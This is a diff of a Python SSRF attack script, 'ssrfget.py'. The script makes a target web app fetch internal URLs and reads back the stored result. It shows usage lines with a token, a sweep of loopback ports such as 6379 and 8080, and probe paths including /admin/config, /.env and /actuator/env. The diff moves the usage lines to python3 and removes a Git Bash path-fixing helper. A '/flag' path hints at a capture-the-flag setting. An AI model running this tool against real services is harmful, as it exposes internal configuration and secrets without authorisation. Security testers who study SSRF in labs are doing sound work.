@@ -8,25 +8,22 @@ artifact the app just stored. This script does both halves in one call.
 
 Usage:
   # read internal paths on the app's own port (the usual case)
-  python ssrfget.py --base https://target --token TOK /admin/config /admin/health
+  python3 ssrfget.py --base https://target --token TOK /admin/config /admin/health
 
   # sweep loopback ports to find internal services
-  python ssrfget.py --base https://target --token TOK --sweep
+  python3 ssrfget.py --base https://target --token TOK --sweep
 
   # non-default SSRF endpoint / body key / internal host
-  python ssrfget.py --base https://target --token TOK \
+  python3 ssrfget.py --base https://target --token TOK \
       --endpoint /api/import --param src --host 127.0.0.1:8080 /internal/config
 
 Notes:
   * The stored-artifact key is auto-detected (avatar_url, file, path, url, ...).
     If the endpoint returns the fetched content inline instead, that is printed too.
-  * Paths are de-mangled automatically — Git Bash rewrites a leading /admin/config
-    into C:/Program Files/Git/admin/config before Python ever sees it.
 """
 import argparse
 import concurrent.futures as cf
 import json
-import os
 import random
 import re
 import string
@@ -49,24 +46,6 @@ SWEEP_PORTS = [80, 443, 3000, 3001, 4000, 5000, 5001, 6379, 8000, 8001, 8080,
 PROBE_PATHS = ["/", "/admin", "/admin/config", "/admin/health", "/internal",
                "/config", "/debug", "/metrics", "/actuator/env", "/.env",
                "/api/admin", "/api/internal", "/flag"]
-
-
-def demangle(p):
-    """Undo MSYS/Git-Bash argv path conversion: it rewrites a leading /foo/bar
-    into <GitRoot>/foo/bar before the interpreter sees it."""
-    exe = os.environ.get("EXEPATH")
-    roots = []
-    if exe:
-        roots.append(os.path.dirname(exe))          # C:\Program Files\Git\bin -> ...\Git
-    roots += [r"C:\Program Files\Git", r"C:\Program Files (x86)\Git", r"C:\msys64"]
-    norm = p.replace("\\", "/")
-    for root in roots:
-        r = root.replace("\\", "/").rstrip("/")
-        if r and norm.lower().startswith(r.lower() + "/"):
-            fixed = norm[len(r):]
-            sys.stderr.write("[!] de-mangled %r -> %r\n" % (p, fixed))
-            return fixed
-    return norm if norm.startswith("/") else "/" + norm
 
 
 def find_stored_path(obj):
@@ -209,7 +188,7 @@ def main():
         if not a.paths:
             ap.error("give one or more paths, or --sweep")
         cal = calibrate(sess, a, a.host)
-        targets = ["%s://%s%s" % (a.scheme, a.host, demangle(p)) for p in a.paths]
+        targets = ["%s://%s%s" % (a.scheme, a.host, p) for p in a.paths]
         with cf.ThreadPoolExecutor(a.threads) as ex:
             for t, (label, body) in zip(targets, ex.map(lambda u: ssrf(sess, a, u), targets)):
                 report(label, t, body, cal)
